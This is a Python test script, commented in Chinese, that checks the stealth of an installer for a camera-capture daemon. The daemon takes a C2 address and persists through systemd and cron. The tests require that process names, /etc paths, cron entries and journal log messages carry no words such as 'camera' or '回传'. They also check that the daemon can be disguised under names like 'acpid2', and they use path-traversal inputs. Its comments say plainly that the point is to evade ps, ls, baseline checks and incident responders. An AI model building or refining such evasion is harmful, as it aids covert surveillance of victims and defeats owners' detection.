#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
命名体系伪装守卫（verify_name_stealth）
======================================

为什么需要
----------
此前 camd 这个前缀同时出现在 conf 目录、二进制名、服务名、cron 名、锁文件
名、单元描述里——字面即 "camera daemon"。而 ps 与 /etc 正是巡检、基线采集、
应急响应最先看的两处：一条 `ps aux` 或 `ls /etc` 就能读出意图。

改为全部落点由单一 $NAME 派生、默认中性、可 --name 覆盖。

本守卫断言什么
--------------
正向（N1–N8）：默认名不带语义、--name 覆盖后全部落点随之改变、
              三条非法名被拒（路径穿越 / 非法字符 / 超长 comm 截断）、
              systemctl 与 ps 调用不再写字面服务名。

反向（R1）：移除 validate_name 调用后，路径穿越必须**真的写出去**——
            若移除前后行为一致，说明校验形同虚设，守卫是恒绿的。

最阴的两条
----------
1. comm 截断：内核 comm 是 15 字符 + NUL（TASK_COMM_LEN=16）。名字超长时
   install 按 $NAME 匹配、运行时 comm 却是截断值——功能一切正常，
   只有卸载时杀不掉、status 进程计数恒为 0。所以长度必须在入口拦。

2. 守卫自身失配：改名后若守卫仍按旧字面量 camd 找落点，替换串匹配不上，
   "未改变模板内容" 一路全绿而什么都没验。故本守卫的期望路径一律从
   模板里解析出的默认 NAME 派生，绝不硬编码。
"""

import os
import re
import shutil
import subprocess
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TPL = os.path.join(ROOT, "onekey.sh")
CAMD = os.path.join(os.path.dirname(ROOT), "agent_windows", "build", "linux", "camd")
SRC_DIR = os.path.join(os.path.dirname(ROOT), "agent_windows", "src")

# 运行期日志里不得出现的语义词。stderr 在 systemd 下进 journal，
# 落点名伪装得再好，一条 journalctl 也会被这些词捅破。
LOG_SEMANTIC = ["cam_daemon", "cam_source", "cam_frame", "camera",
                "采集", "回传", "摄像头"]


def log_semantic_hits(src_text):
    """扫 fprintf(stderr/stdout, ...) 的字符串字面量，返回命中的语义词。

    先剥注释：注释里的语义词不是泄露（不进 journal），若不剥离，注释命中会
    与真实输出混在一起，既误报又掩盖真正的输出泄露。
    """
    hits = []
    body = re.sub(r'/\*.*?\*/', '', src_text, flags=re.S)
    body = re.sub(r'//[^\n]*', '', body)
    for m in re.finditer(
            r'fprintf\s*\(\s*(?:stderr|stdout)\s*,.*?\)\s*;', body, re.S):
        seg = m.group(0)
        for w in LOG_SEMANTIC:
            if w in seg:
                hits.append(w)
    return sorted(set(hits))

FAILS = []


def check(cond, name, detail=""):
    if cond:
        print("[OK  ] %s  -- %s" % (name, detail))
        return True
    print("[FAIL] %s  -- %s" % (name, detail))
    FAILS.append(name)
    return False


def default_name(src):
    """从模板解析默认 NAME。解析不到即 FATAL——静默回落会让守卫恒绿。"""
    m = re.search(r'^NAME="\$\{NAME:-([^}]+)\}"', src, re.M)
    return m.group(1) if m else None


def build_pkg(dst, tpl=TPL, arch="amd64"):
    """用 make_onekey.py 生成带内嵌产物的一键脚本。"""
    gen = os.path.join(ROOT, "make_onekey.py")
    cmd = [sys.executable, gen, "amd64=%s" % CAMD, "-o", dst]
    if tpl != TPL:
        # 生成器只吃 -o；模板替换用直接复制的方式绕过
        shutil.copyfile(tpl, dst)
        return 0, ""
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return r.returncode, (r.stdout or "") + (r.stderr or "")


def run(pkg, action, extra=None, prefix=None):
    env = dict(os.environ)
    if prefix is not None:
        env["PREFIX"] = prefix
    cmd = ["sh", pkg, action] + (extra or [])
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=180, env=env)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def main():
    if not os.path.exists(CAMD):
        print("[FATAL] 缺少产物: %s" % CAMD)
        return 1
    src = open(TPL, encoding="utf-8").read()
    N = default_name(src)
    if not check(N is not None, "N0 能从模板解析默认 NAME", str(N)):
        return 1

    # ---- N1 默认名不带语义 ----
    bad_words = ["cam", "video", "capture", "frame", "spy", "monitor"]
    hit = [w for w in bad_words if w in N.lower()]
    check(not hit, "N1 默认名不含语义词", "NAME=%s 命中=%s" % (N, hit))

    # ---- N2 落点全部由 NAME 派生（模板里无字面 camd 路径）----
    code_lines = [l for l in src.splitlines()
                  if not l.lstrip().startswith("#")]
    literal = [l.strip() for l in code_lines
               if re.search(r'/(etc|usr|var)/(lib|cron\.d|systemd)?/?\w*camd', l)]
    check(not literal, "N2 代码行无字面 camd 落点", "残留=%s" % literal)

    # ---- N3 systemctl / ps 调用用变量而非字面服务名 ----
    lit_svc = [l.strip() for l in code_lines
               if re.search(r'systemctl\s+\w+\s+camd\.service', l)]
    check(not lit_svc, "N3 systemctl 不写字面 camd.service", "残留=%s" % lit_svc)
    check('awk -v n="$NAME"' in src, "N4 ps comm 匹配用 $NAME",
          "awk -v n 存在")

    # ---- 生成真实包 ----
    pkg = "/tmp/ok_name.sh"
    rc, out = build_pkg(pkg)
    if not check(rc == 0, "N5 包生成成功", out[-200:] if rc else ""):
        return 1

    # ---- 三条非法名必须被拒 ----
    cases = [
        ("R-pathtrav", "../../../tmp/evil", "路径穿越"),
        ("R-charset", "bad.name!", "非法字符"),
        ("R-solong", "a" * 16, "超长（comm 截断）"),
    ]
    # 每条都要先确认现场干净，再断言"跑完依然没写出去"。
    # 只断言 rc!=0 是不够的：rc 可能因别的原因非零（缺产物、C2 不可达），
    # 那样"没写出去"就成了巧合而非校验生效——典型的假通过。
    escape_targets = ["/tmp/evilp", "/tmp/tmp/evilp"]
    for tag, nm, why in cases:
        for t in escape_targets:
            shutil.rmtree(t, ignore_errors=True)
        rc2, out2 = run(pkg, "install", ["--c2", "127.0.0.1:1",
                                         "--name", nm])
        ok = rc2 != 0 and ("--name" in out2 or "comm" in out2)
        check(ok, "N6 %s 被拒（%s）" % (tag, why),
              "rc=%d %s" % (rc2, out2.strip()[:120]))
        escaped = [t for t in escape_targets if os.path.exists(t)]
        check(not escaped, "N6 %s 未写出越界路径" % tag, "越界=%s" % escaped)

    # ---- N7 --name 覆盖后落点随之改变 ----
    custom = "acpid2"
    pfx = tempfile.mkdtemp(prefix="nmA_")
    rc3, out3 = run(pkg, "install", ["--c2", "127.0.0.1:1",
                                     "--name", custom], prefix=pfx)
    if check(rc3 == 0, "N7a 自定义名 install 成功",
             "rc=%d %s" % (rc3, out3.strip()[:160])):
        want = ["etc/%s/%s.conf" % (custom, custom),
                "usr/local/bin/%s" % custom,
                "var/lib/%s/run.sh" % custom]
        got = [w for w in want if os.path.exists(os.path.join(pfx, w))]
        missing = [w for w in want if w not in got]
        # cron 落点有两种形态（探测按 $PREFIX/etc 的发行版特征判定）：
        #   etc/cron.d/<NAME>   Debian/RHEL 系——该目录是发行版补丁，上游
        #                      Vixie cron 根本不扫描它，写了也不执行
        #   etc/crontab         通用回退
        # 空假根没有任何发行版特征 -> "未知" -> 回退。只认 cron.d 的判据
        # 在此形态下恒红，且与"真的没装上"无法区分。故认两种形态之一，
        # 并要求内容命中自定义名，避免把系统自带 crontab 当成落点（恒绿）。
        cron_hit = None
        for rel in ("etc/cron.d/%s" % custom, "etc/crontab"):
            p = os.path.join(pfx, rel)
            if not os.path.exists(p):
                continue
            try:
                body = open(p, encoding="utf-8", errors="ignore").read()
            except OSError:
                continue
            if custom in body and "run.sh" in body:
                cron_hit = rel
                break
        if cron_hit is None:
            missing.append("cron 条目")
        check(len(got) == len(want) and cron_hit is not None,
              "N7b 落点随 NAME 改变",
              "齐全=%s/%s 缺失=%s cron落点=%s"
              % (len(got), len(want), missing, cron_hit or "无"))
        # 默认名不应出现
        check(not os.path.exists(os.path.join(pfx, "etc", N)),
              "N7c 未同时留下默认名落点", "NAME=%s" % N)
        # run.sh 内路径也必须是自定义名
        runsh = os.path.join(pfx, "var/lib/%s/run.sh" % custom)
        if os.path.exists(runsh):
            body = open(runsh).read()
            check(custom in body and N not in body,
                  "N7d run.sh 内路径为自定义名",
                  "含%s=%s 含默认名=%s" % (custom, custom in body, N in body))

    shutil.rmtree(pfx, ignore_errors=True)

    # ---- N8 默认名 install：落点是中性名 ----
    pfx2 = tempfile.mkdtemp(prefix="nmB_")
    rc4, out4 = run(pkg, "install", ["--c2", "127.0.0.1:1"], prefix=pfx2)
    if check(rc4 == 0, "N8a 默认名 install 成功",
             "rc=%d" % rc4):
        check(os.path.exists(os.path.join(pfx2, "etc", N, "%s.conf" % N)),
              "N8b 默认名落点=%s" % N, "")
        check(not os.path.exists(os.path.join(pfx2, "etc", "camd")),
              "N8c 无 camd 落点", "")
    shutil.rmtree(pfx2, ignore_errors=True)

    # ---- R1 反向：移除 validate_name 后路径穿越必须真写出去 ----
    mut = src.replace("\nvalidate_name\n", "\n", 1)
    if mut == src:
        check(False, "R1a 反向注入生效（未移除 validate_name 调用）")
    else:
        mtpl = "/tmp/onekey_noname.sh"
        open(mtpl, "w").write(mut)
        mpkg = "/tmp/ok_name_mut.sh"
        shutil.copyfile(TPL, mpkg)  # 占位，下面用注入版重建
        # 直接把注入版当作包：用 make_onekey 无法指定模板，故手工拼接内嵌区
        rc5, out5 = build_pkg(mpkg)
        if rc5 == 0:
            # 把生成的包里的脚本体替换为注入版（保留内嵌区）
            gen_body = open(mpkg, encoding="utf-8").read()
            m = re.search(r'(#\s*PAYLOAD_BEGIN.*)$', gen_body, re.S)
            if m:
                payload = m.group(1)
                open(mpkg, "w", encoding="utf-8").write(mut + "\n" + payload)
            for t in escape_targets:
                shutil.rmtree(t, ignore_errors=True)
            rc6, out6 = run(mpkg, "install",
                            ["--c2", "127.0.0.1:1",
                             "--name", "../../../tmp/evilp"])
            wrote = [t for t in escape_targets if os.path.exists(t)]
            # 严格判据：移除校验后，越界路径必须**真的被写出来**。
            # 此前写成 `rc6==0 and wrote or rc6!=0` —— 那是个恒真式
            # （rc!=0 即成立），无论写没写都报 OK，是恒绿守卫。
            check(bool(wrote), "R1b 移除校验后越界路径真的被写出",
                  "rc=%d 写出=%s" % (rc6, wrote))
            # R1c：与 N6 对照。N6 有校验时未写出、此处无校验时写出，
            # 两者行为不同才证明 N6 的"未写出"来自校验而非巧合。
            check(bool(wrote), "R1c 与 N6 行为不同（证明 N6 非恒绿）",
                  "有校验未写 / 无校验写出=%s" % bool(wrote))
            for t in escape_targets:
                shutil.rmtree(t, ignore_errors=True)

    # ---- N9：运行期日志不得泄露语义 ------------------------------------
    # 落点名伪装只是半件事。stderr 在 systemd 下进 journal，
    # `journalctl -u <伪装服务名>` 一查就能读到 cam_daemon_run 或"采集源创建失败"。
    # 排查者恰恰是在失败时才去看 journal——所以这条泄露专挑最容易被看的时刻。
    TMPD = tempfile.mkdtemp(prefix="nmC_")
    _srcs = [os.path.join(SRC_DIR, f) for f in ("cam_daemon_main.c", "cam_daemon.c")]
    _srcs = [p for p in _srcs if os.path.exists(p)]
    check(bool(_srcs), "N9a 守护源码存在", "%s" % [os.path.basename(p) for p in _srcs])
    for _p in _srcs:
        _hits = log_semantic_hits(open(_p, encoding="utf-8").read())
        check(not _hits, "N9b 日志无语义词 %s" % os.path.basename(_p),
              "命中=%s" % _hits)

    # ---- R2：N9b 必须非恒绿 --------------------------------------------
    # 注入一条含内部函数名的日志，同一扫描函数必须检出。
    _inj = os.path.join(TMPD, "inj_main.c")
    _orig = open(_srcs[0], encoding="utf-8").read()
    _mut = _orig.replace('"[FATAL] 运行失败: code=%d（%s）\\n"',
                         '"[FATAL] cam_daemon_run 返回 %d（%s）\\n"')
    check(_mut != _orig, "R2a 注入生效（中性日志被还原为泄露版）",
          "changed=%s" % (_mut != _orig))
    open(_inj, "w", encoding="utf-8").write(_mut)
    _hits2 = log_semantic_hits(open(_inj, encoding="utf-8").read())
    check(bool(_hits2), "R2b 注入后 N9b 检出（证明非恒绿）", "命中=%s" % _hits2)

    print("\n计数: 失败 %d" % len(FAILS))
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
